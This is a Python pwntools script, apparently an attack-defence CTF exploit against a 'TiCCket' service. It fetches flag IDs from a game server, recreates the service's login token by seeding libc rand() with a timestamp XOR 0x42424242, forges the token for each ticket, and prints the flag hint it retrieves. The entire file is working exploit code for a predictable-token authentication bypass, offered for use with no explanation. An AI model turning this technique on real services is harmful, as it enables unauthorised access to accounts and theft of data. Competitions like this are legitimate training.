#!/usr/bin/env python3

from pwn import *
import sys
import json
import requests
from ctypes import CDLL
from dateutil import parser

port = int(args.PORT or 1337)
host = sys.argv[1]

# get flagsid
flags = requests.get('http://10.10.0.1:8081/flagIds').json()
# change user agent
flags = flags['TiCCket'][host]

for flag in flags:
    parsed = json.loads(flag)

    io = connect(host, port)

    io.sendline(b"1")
    io.sendline(parsed["ctf_id"])
    io.sendline(b"")
    io.sendline(b"1")

    io.recvuntil(b"on:")
    #print(io.recvline().decode().strip())

    datestr = io.recvline().decode().strip()
    date = parser.parse(datestr)
    #print(date.timestamp())

    seed = int(date.timestamp()) ^ 0x42424242
    
    #print(io.recvline())

    libc = CDLL("libc.so.6")
    #now = int(floor(time.time()))

    libc.srand(seed)

    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    token = ""

    for i in range(16):
        randval = libc.rand()
        token += charset[randval + ((randval // 62 << 5) - (randval // 62)) * -2]
    
    print(token)

    #print(libc.rand())

    io.sendline(b"5")
    io.sendline(b"1")
    io.sendline(parsed["ctf_id"])
    io.sendline(token)

    io.sendline(b"3")
    io.sendline(parsed["ticket_id"])
    io.sendline(b"2")

    io.recvuntil(b"Here's a hint:")
    print(io.recvline(timeout=1), flush=True)

    io.close()

    #io.interactive()